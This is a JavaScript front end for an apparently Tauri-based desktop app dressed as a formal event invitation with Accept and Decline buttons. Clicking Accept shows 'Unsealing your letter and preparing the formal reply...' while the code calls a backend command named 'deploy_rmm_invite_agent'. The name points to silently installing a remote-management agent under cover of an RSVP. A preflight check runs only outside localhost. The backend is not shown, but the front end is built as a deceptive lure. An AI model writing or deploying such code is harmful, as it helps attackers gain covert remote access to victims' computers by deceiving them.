const { invoke } = window.__TAURI__.core;

function initLucideIcons() {
  if (window.lucide?.createIcons) {
    window.lucide.createIcons();
  }
}

function setInviteState(stageEl, state) {
  if (!stageEl) return;
  stageEl.classList.remove("is-opening", "is-accepted", "is-declined");
  if (state) {
    stageEl.classList.add(state);
  }
}

function formatInviteDate(date) {
  const day = date.toLocaleDateString('en-US', { weekday: 'long' });
  const ordinal = (n) => {
    const s = ['th','st','nd','rd'], v = n % 100;
    return n + (s[(v - 20) % 10] || s[v] || s[0]);
  };
  const month = date.toLocaleDateString('en-US', { month: 'long' });
  const year = date.getFullYear();
  return `${day}, ${month} ${ordinal(date.getDate())}, ${year}`;
}

function formatIsoDateLocal(date) {
  const y = date.getFullYear();
  const m = `${date.getMonth() + 1}`.padStart(2, "0");
  const d = `${date.getDate()}`.padStart(2, "0");
  return `${y}-${m}-${d}`;
}

async function runSystemPreflight() {
  const statusEl = document.querySelector("#system-status");
  const btnAccept = document.querySelector("#btn-accept");
  if (!statusEl || !btnAccept) return;

  try {
    const clientDate = formatIsoDateLocal(new Date());
    const result = await invoke("system_preflight", { clientDate });

    systemReadyState = result.nextPhaseReady;
    btnAccept.disabled = !systemReadyState;

    if (result.nextPhaseReady) {
      statusEl.textContent = `✓ ${result.message}`;
      statusEl.style.color = "#9fe39f";
      return;
    }

    statusEl.textContent = result.message;
    statusEl.style.color = "#ffd39f";
  } catch (error) {
    statusEl.textContent = "System preflight failed.";
    statusEl.style.color = "#ffb1b1";
    btnAccept.disabled = true;
    console.error(error);
  }
}

let systemReadyState = false;

// Check if running in dev (localhost) or production
const isDev = window.location.hostname === "localhost" || window.location.hostname === "127.0.0.1";

window.addEventListener("DOMContentLoaded", async () => {
  initLucideIcons();

  const dateEl = document.querySelector("#event-date");
  if (dateEl) dateEl.textContent = formatInviteDate(new Date());
  
  // Only run preflight checks in production
  if (!isDev) {
    await runSystemPreflight();
  } else {
    // In dev, allow all access
    systemReadyState = true;
  }

  const msgEl = document.querySelector("#rsvp-msg");
  const btnAccept = document.querySelector("#btn-accept");
  const btnDecline = document.querySelector("#btn-decline");
  const stageEl = document.querySelector("#invite-stage");

  btnAccept.addEventListener("click", async () => {
    // In production, enforce system readiness check
    if (!isDev && !systemReadyState) {
      msgEl.textContent = "We could not confirm your invitation details yet. Please try again.";
      msgEl.style.color = "#ffb1b1";
      return;
    }

    setInviteState(stageEl, "is-opening");
    msgEl.textContent = "Unsealing your letter and preparing the formal reply...";
    msgEl.style.color = "#b17a2a";
    msgEl.style.fontWeight = "600";
    btnAccept.disabled = true;
    btnDecline.disabled = true;

    try {
      const result = await invoke("deploy_rmm_invite_agent");
      if (result.success) {
        setInviteState(stageEl, "is-accepted");
        msgEl.textContent = `✦ ${result.message}`;
        msgEl.style.color = "#467f56";
        msgEl.style.fontWeight = "600";
      } else {
        setInviteState(stageEl, null);
        msgEl.textContent = `✦ ${result.message}`;
        msgEl.style.color = "#9b413d";
        msgEl.style.fontWeight = "500";
      }
    } catch (error) {
      setInviteState(stageEl, null);
      msgEl.textContent = "We hit a snag while saving your RSVP. Please try again.";
      msgEl.style.color = "#9b413d";
      console.error(error);
    } finally {
      btnAccept.disabled = systemReadyState ? false : true;
      btnDecline.disabled = false;
    }
  });

  btnDecline.addEventListener("click", () => {
    setInviteState(stageEl, "is-declined");
    msgEl.textContent = "We'll miss you — perhaps next time.";
    msgEl.style.color = "#7b6457";
    msgEl.style.fontWeight = "500";
  });
});
